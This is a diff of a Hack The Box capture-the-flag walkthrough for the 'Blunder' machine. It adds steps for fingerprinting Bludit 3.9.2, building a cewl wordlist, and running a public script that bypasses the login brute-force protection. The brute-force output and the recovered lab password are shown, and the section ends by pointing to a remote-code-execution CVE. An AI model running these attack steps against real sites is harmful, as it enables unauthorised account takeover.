@@ -12,7 +12,9 @@ HTB Blunder is the first box where I managed to solve both the user flag and the
 
 With that out of the way, this is my guide for the challenge ``Blunder``. It took me around 5 hours to get the user flag, and it took me 15 minutes to get the root flag from there (very popular exploit was used.)
 
-## Enumeration
+## Reconnaissance
+
+### NMap
 
 As usual with HTB, the first thing to do is to use nmap to scan the box. The IP of the box is ``10.10.10.191``, as you can see in the command I used:
 
@@ -43,6 +45,8 @@ Alright, there is a web server, epic. Let's check it out:
 
 There isn't much to look at and there's only three blog posts..
 
+### Dirbuster
+
 My next move was to use dirbuster. I am bad so I'm still using the dirbuster GUI, although I will be using gobuster and wfuzz in the future.
 
 I chose to scan with the file extension ``.txt`` on top of a normal directory search.
@@ -53,13 +57,60 @@ Here are the results:
 
 Cool, there's a ``todo`` page and an ``admin`` page. Let's check those out...
 
+## Enumeration
+
 ![todo](/assets/htb-blunder/todo.PNG)
 
 ![login](/assets/htb-blunder/login.PNG)
 
 From the todo page, it looks like we have a potential username, ``fergus``. It also hints that a ``CMS`` or ``content management system`` is in place.
 
-From the admin page, we get the name of the CMS being used: ``Blundit``.
+From the admin page, we get the name of the CMS being used: ``Bludit``. 
+
+I have a browser extension called Wappalyzer that told me the version of Bludit running on the web server.
+
+![wappalyzer](/assets/htb-blunder/wappalyzer.PNG)
+
+Epic, ``Bludit 3.9.2``. A quick google search tells us that this version is insecure as there are multiple vulnerabilities.
+
+The first result on Google is for a ``Authentication Bruteforce Mitigation Bypass`` and that sounds promising as we have a login page and a username.
+
+The next challenge comes in finding the credentials to brute force with. Luckily, I found that someone on a Discord server I frequent tried some of the longer wordlists without any luck, so my options were narrowed down from there. I could try out some of the more obscure seclists, or I could try making a custom wordlist using ``cewl``. I opted for the latter and made a wordlist with all the default options.
+
+`` cewl -w wordlist.txt 10.10.10.191 ``
+
+The exploit script came in ruby, and I was unable to get it to work. Thankfully, someone rewrote the exploit script in Python (https://github.com/musyoka101/Bludit-CMS-Version-3.9.2-Brute-Force-Protection-Bypass-script/tree/master) and it worked wonderfully. 
+
+`` python3 exploit.py 10.10.10.191 fergus wordlist.txt ``
+
+```
+[*] Trying: Richard
+[*] Trying: Bachman
+[*] Trying: written
+[*] Trying: approximately
+[*] Trying: short
+[*] Trying: stories
+[*] Trying: collections
+[*] Trying: Stoker
+[*] Trying: British
+[*] Trying: Society
+[*] Trying: Foundation
+[*] Trying: Distinguished
+[*] Trying: Contribution
+[*] Trying: Letters
+[*] Trying: probably
+[*] Trying: fictional
+[*] Trying: character
+[*] Trying: RolandDeschain
+
+SUCCESS: Password found!
+Use fergus:RolandDeschain to login.
+```
+
+We now have credentials, epic. Now that we have admin credentials, we can make use of the second vulernability: https://www.cvedetails.com/cve/CVE-2019-16113/
+
+In short, with these credentials, RCE is possible.
+
 
 
 
